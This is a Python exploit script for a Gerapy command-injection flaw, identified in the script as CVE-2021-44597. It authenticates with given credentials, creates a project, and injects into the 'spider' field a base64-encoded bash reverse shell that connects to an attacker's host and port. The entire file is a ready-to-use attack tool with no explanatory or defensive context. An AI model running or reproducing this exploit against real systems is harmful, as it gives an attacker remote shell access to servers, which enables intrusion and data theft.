import requests
import json
import base64
import argparse
import re
import string
import random

class Gerapy():
    def __init__(self,target,username,password,lhost,lport):
        self.target = target
        self.username = username
        self.password = password
        self.lhost = lhost
        self.lport = lport
        self.url = self.check_url()
        self.token = self.get_token()
        self.project_name = self.create_project()
        self.send_payload()

    def check_url(self):
        check = self.target[-1]
        if check == "/":
            return self.target
        else:
            fixed_url = self.target + "/"
            return fixed_url

    def convert(self,lhost,lport):
        revs_string = "bash -c 'bash -i >& /dev/tcp/" + lhost + "/" + lport + " 0>&1'"
        revs_string_bytes = revs_string.encode("ascii") 
          
        base64_bytes = base64.b64encode(revs_string_bytes) 
        base64_string = base64_bytes.decode("ascii") 
          
        return base64_string 

    def get_token(self):
        requests.packages.urllib3.disable_warnings()
        print("Logging in")
        login_url = self.url + "api/user/auth"
        json_data = {
                "username":self.username,
                "password":self.password
                }
        token_req = requests.post(login_url,json=json_data,verify=False)
        if "token" in token_req.text:
            re_token = re.findall("{\"token\":\"(.*)\"}",token_req.text)
            return re_token[0]
        else:
            print("Unable to log in. Check credentials.")

    def create_project(self):
        requests.packages.urllib3.disable_warnings()
        print("Creating project")
        create_url = self.url + "api/project/create"
        project_name = ''.join(random.choices(string.ascii_uppercase +
                             string.digits, k=7))
        json_data = {
                "name":project_name
                }
        headers = {
                "Authorization":"Token " + self.token
                }
        requests.post(create_url,json=json_data,headers=headers,verify=False)
        return project_name
    
    def send_payload(self):
        requests.packages.urllib3.disable_warnings()
        print("Sending Payload")
        project_url = self.url + "/api/project/" + self.project_name + "/parse"
        payload = self.convert(self.lhost,self.lport)
        json_data = {
                "spider":"hacked|echo " + payload + "|base64 -d|sh"
                }
        headers = {
                "Authorization":"Token " + self.token
                }
        requests.post(project_url,json=json_data,headers=headers,verify=False)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Gerapy CVE-2021-44597 / Authenticated Arbitrary Code Execution ')
    parser.add_argument('-t', metavar='<Target URL>', help='target/host URL, E.G: http://gerapy.target/', required=True)
    parser.add_argument('-u', metavar='<username>', help='Username', required=True)
    parser.add_argument('-p', metavar='<password>', help="Password", required=True)
    parser.add_argument('-lhost', metavar='<lhost>', help='Your IP Address', required=True)
    parser.add_argument('-lport', metavar='<lport>', help='Your Listening Port', required=True)
    args = parser.parse_args()

    try:
        Gerapy(args.t,args.u,args.p,args.lhost,args.lport)
    except KeyboardInterrupt:
        print("Bye Bye!")
        exit()
